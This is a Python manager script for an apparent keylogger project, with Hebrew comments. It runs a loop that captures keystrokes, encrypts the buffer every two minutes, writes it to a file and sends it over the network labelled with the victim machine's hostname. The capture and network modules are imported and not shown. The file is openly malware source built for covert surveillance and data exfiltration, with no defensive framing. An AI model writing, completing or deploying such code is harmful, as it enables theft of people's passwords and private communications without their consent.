import time
import socket
from time import sleep

from file_writer import FileWriter
from keylogger_service import KeyLogger
from encryptor import Encryptor
from network_writer import NetworkWriter


class Manager:
    def __init__(self):
        self.machine_name = socket.gethostname()
        self.file_writer= FileWriter()          # מאתחל את המחלקות
        self.keylogger_service = KeyLogger(self.machine_name)
        self.encryptor = Encryptor()
        self.network_writer = NetworkWriter()

    def data_acquisition(self):
        while True:
            self.keylogger_service.start() # מפעילה את פונקציית האזנה
            time.sleep(120)
            data = self.keylogger_service.get_and_clear_buffer()  # מושכת הנתונים שנקלטו עד עכשיו
            new_data = self.encryptor.encrypt_dict(data) # מצפין את הדאטא
            self.file_writer.send_data(new_data ,self.machine_name) # שולח את הדאטא המוצפן לכתיבה לקובץ
            self.network_writer.send_data(new_data, self.machine_name)


if __name__ == "__main__":

    # Initialize the Manager with the key
    manager = Manager()

    try:
        manager.data_acquisition()
    except KeyboardInterrupt:
        print("\nManager stopped.")

